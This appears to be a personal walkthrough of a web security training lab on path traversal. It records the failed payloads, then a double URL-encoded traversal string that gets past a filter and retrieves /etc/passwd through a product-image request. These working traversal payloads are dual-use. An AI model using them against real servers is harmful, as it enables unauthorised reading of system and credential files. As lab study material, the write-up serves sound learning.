* Lab Contains
- vulnerability on display of product images
- block path traversal sequences
- perform URL-decode before using it
* End Goal
- retrieve the contents of ~/etc/passwd~ file
* Solution
- Access the lab
- Open any product image on new tab & intercept the request with burpsuite
- change file name to some basic payload like
  - ~../../../etc/passwd~
    - Not found
  - ~/etc/passwd~
    - Not found
  - ~....//....//....//etc/passwd~
    - Not found
- Now try to encode our payload and try
  - Payload -> ~../../../etc/passwd~
  - Encode -> ~..%2f..%2f..%2fetc/passwd~
    - Still not working, hmm! since it use URL-decode that's why it is not working
    - Encode again: ~..%252f..%252f..%252fetc/passwd~
      - Awala!! retrieved the contents of ~/etc/passwd~
* Payload to solve lab
*Pass traversal sequence double URL-Encoded value*

1. ~../../../etc/passwd~
   1. ~..%2f..%2f..%2fetc/passwd~
      1. ~..%252f..%252f..%252fetc/passwd~
